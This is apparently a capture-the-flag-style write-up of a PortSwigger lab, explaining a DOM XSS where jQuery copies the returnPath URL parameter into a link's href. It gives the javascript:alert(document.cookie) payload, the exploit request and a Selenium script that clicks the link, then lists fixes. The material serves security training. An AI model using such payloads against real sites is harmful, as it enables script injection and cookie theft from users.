---
title: "DOM XSS in jQuery anchor href attribute sink using location.search source"
date: 2026-08-26 09:00:00 -0500
categories: [PortSwigger, Cross-site-scripting]
tags: [portswigger, cwe-79, xss, dom-based, jquery, href, location-search]
description: "A client-side jQuery script copies a URL query parameter into an anchor's href with no scheme check, so returnPath=javascript:alert(document.cookie) turns the Back link into a script-runner. Unlike innerHTML sinks, this one only fires when the link is clicked."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: DOM XSS in jQuery anchor href attribute sink using location.search source
---

## Overview

This lab is a **DOM-based** [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) bug. The server sends a clean page; the vulnerability lives entirely in client-side JavaScript that reads attacker-controlled data from the URL and uses it to build a link.

## The vulnerable code

The feedback page runs this jQuery:

```js
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
```

Two ingredients make this exploitable:

- **A source** — `location.search`, specifically the `returnPath` query parameter, fully controlled by the attacker.
- **A sink** — jQuery's `.attr("href", ...)`, which sets the `href` of the `<a id="backLink">Back</a>` element to whatever string you give it, with no validation of the URL scheme.

## Why a `javascript:` URL fires

When a browser follows a link whose `href` begins with `javascript:`, it executes the rest of the URL as script. Because the code never checks that `returnPath` is a normal `http`/`https`/relative URL, you can hand it a `javascript:` URL and the Back link becomes a script-runner.

```
javascript:alert(document.cookie)
```

## The key difference from other DOM sinks

In `innerHTML` or `document.write` sinks, the payload runs as soon as the page loads. This sink is different: setting an `href` does not execute anything by itself — the `javascript:` URL only runs **when the link is clicked**. So proving the bug requires loading the page *and* clicking the Back link.

## The working request

The payload is delivered entirely in the URL:

```
GET /feedback?returnPath=javascript:alert(document.cookie)
```

Because the sink runs in the browser and needs a click, you have to drive a real JavaScript engine — `curl` only sees the clean server response. Loading the page in headless Chromium, reading the modified `href`, and clicking the link fires the `alert`, and the lab flips to **Solved**.

```python
import urllib.parse, time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

base = "https://YOUR-LAB-ID.web-security-academy.net"
url = base + "/feedback?returnPath=" + urllib.parse.quote("javascript:alert(document.cookie)", safe="")
o = Options()
for a in ["--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
          "--disable-gpu", "--ignore-certificate-errors"]:
    o.add_argument(a)
d = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=o)
d.get(url); time.sleep(1)
print("href =", d.find_element("id", "backLink").get_attribute("href"))
d.find_element("id", "backLink").click(); time.sleep(1)
al = d.switch_to.alert; print("FIRED:", al.text); al.accept()
d.quit()
```

## The fix

- Validate the URL scheme before assigning it to an `href`: allow only `http:`/`https:` or relative paths, and reject `javascript:` and `data:` URLs.
- Do not pass `location.search` values straight into `.attr("href", ...)` — sanitize or allow-list them first.
- As defense in depth, ship a Content-Security-Policy that blocks inline script execution.
